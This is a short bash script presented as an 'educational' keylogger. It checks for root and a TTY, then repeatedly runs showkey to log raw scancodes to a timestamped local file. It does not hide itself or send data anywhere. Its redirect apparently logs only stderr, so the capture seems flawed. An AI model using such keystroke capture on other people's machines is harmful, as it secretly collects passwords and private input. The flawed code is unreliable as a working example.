#!/bin/bash

# Educational Keylogger Script (TTY only)
# Author: kush68
# License: MIT
# Description: Logs raw key events with timestamps

LOG_DIR="./key_logs"
LOG_FILE="$LOG_DIR/keys_$(date '+%Y-%m-%d_%H-%M-%S').log"

mkdir -p "$LOG_DIR"

echo "[+] Starting keylogger. TTY session required."
echo "[+] Output file: $LOG_FILE"
echo "[+] Press Ctrl+C to stop."

# Check if run in TTY
if [[ $(tty) != /dev/tty* ]]; then
    echo "[-] This script must be run in a TTY (not in GUI terminal)."
    exit 1
fi

# Needs sudo for access
if [[ $EUID -ne 0 ]]; then
    echo "[-] Please run as root (sudo ./keylogger.sh)"
    exit 1
fi

# Capture key presses
while true; do
    showkey --scancodes 2>> "$LOG_FILE"
    sleep 0.1
done
